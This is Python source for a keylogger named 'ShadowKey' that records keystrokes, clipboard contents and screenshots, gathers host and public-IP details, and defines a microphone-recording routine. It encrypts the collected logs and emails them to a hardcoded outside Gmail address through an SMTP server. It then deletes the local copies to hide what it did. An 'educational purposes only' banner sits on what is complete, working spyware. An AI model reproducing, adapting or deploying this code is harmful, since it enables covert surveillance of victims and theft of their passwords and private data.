#!/usr/bin/env python

print('''
  ██████  ██░ ██  ▄▄▄      ▓█████▄  ▒█████   █     █░ ██ ▄█▀▓█████▓██   ██▓
▒██    ▒ ▓██░ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░ ██▄█▒ ▓█   ▀ ▒██  ██▒
░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ░██   █▌▒██░  ██▒▒█░ █ ░█ ▓███▄░ ▒███    ▒██ ██░
  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░░█░ █ ░█ ▓██ █▄ ▒▓█  ▄  ░ ▐██▓░
▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░▒████▓ ░ ████▓▒░░░██▒██▓ ▒██▒ █▄░▒████▒ ░ ██▒▓░
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ▒ ▒▒ ▓▒░░ ▒░ ░  ██▒▒▒ 
░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░  ░ ░▒ ▒░ ░ ░  ░▓██ ░▒░ 
░  ░  ░   ░  ░░ ░  ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░   ░  ░ ░░ ░    ░   ▒ ▒ ░░  
      ░   ░  ░  ░      ░  ░   ░        ░ ░      ░      ░  ░      ░  ░ ░     
                            ░                                         ░ ░     
        [ Advanced Keylogger with Military-Grade Encryption ]
        [ For Educational Purposes Only | Version 1.0.0    ]
        [ Created by Shubham Kumar                      ]
''')

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import subprocess

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "alt.s4-5yu6wkb@yopmail.com"
password = "no_password_needed"
toaddr = "ghostphreaksec@gmail.com"
username = getpass.getuser()
key = "C0DcvpYhOHDzR4ybk5S8fYIjf7axzR6gxWP5ervjXGo="
file_path = os.path.expanduser("~/Documents/ShadowKey/Files")
extend = "/"
file_merge = file_path + extend
os.makedirs(file_path, exist_ok=True)

def send_email(filename, attachment, toaddr):
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = f"ShadowKey Log - {filename}"
        body = f"Log file collected at {time.strftime('%Y-%m-%d %H:%M:%S')}"
        msg.attach(MIMEText(body, 'plain'))
        if not os.path.exists(attachment):
            print(f"[-] File not found: {attachment}")
            return
        with open(attachment, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename= {filename}")
        msg.attach(p)
        s = smtplib.SMTP('smtp.yopmail.com', 587)
        s.starttls()
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        print(f"[+] Email sent successfully: {filename}")
    except Exception as e:
        print(f"[-] Failed to send email: {str(e)}")


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            clipboard_data = subprocess.check_output(['xclip', '-o', '-selection', 'clipboard']).decode()
            f.write("Clipboard Data: \n" + clipboard_data)
        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "w") as f:
            for key in keys:
                k = str(key).replace("'", "")
                f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

file_merge2 = file_merge + 'encrypted_files/'
os.makedirs(file_merge2, exist_ok=True)
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge2 + system_information_e, file_merge2 + clipboard_information_e, file_merge2 + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information]
for file in delete_files:
    try:
        os.remove(file_merge + file)
    except:
        pass

